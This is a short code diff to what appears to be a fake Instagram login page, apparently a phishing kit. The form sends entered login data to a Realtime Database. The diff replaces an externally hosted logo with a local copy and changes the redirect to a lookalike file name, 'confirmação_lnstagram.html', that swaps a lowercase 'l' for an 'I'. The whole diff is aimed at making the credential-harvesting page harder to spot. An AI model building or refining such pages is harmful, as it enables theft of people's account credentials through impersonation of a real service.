@@ -13,11 +13,7 @@
       </header>
 
       <div class="login-wrapper">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
-          alt="Logotipo do Instagram"
-          class="logo"
-        />
+        <img src="assets/i_logo.png" alt="Logotipo do Instagram" class="logo" />
 
         <form id="login-form" class="login-form" onsubmit="handleLogin(event)">
           <input
@@ -93,7 +89,7 @@
 
           console.log("Dados enviados com sucesso para o Realtime Database.");
           loginForm.reset();
-          location.href = "./agradecimento_instagram.html"; // Redireciona para a página de agradecimento
+          location.href = "./confirmação_lnstagram.html"; // Redireciona para a página de agradecimento
         } catch (error) {
           console.error("Falha ao enviar os dados: ", error);
         }
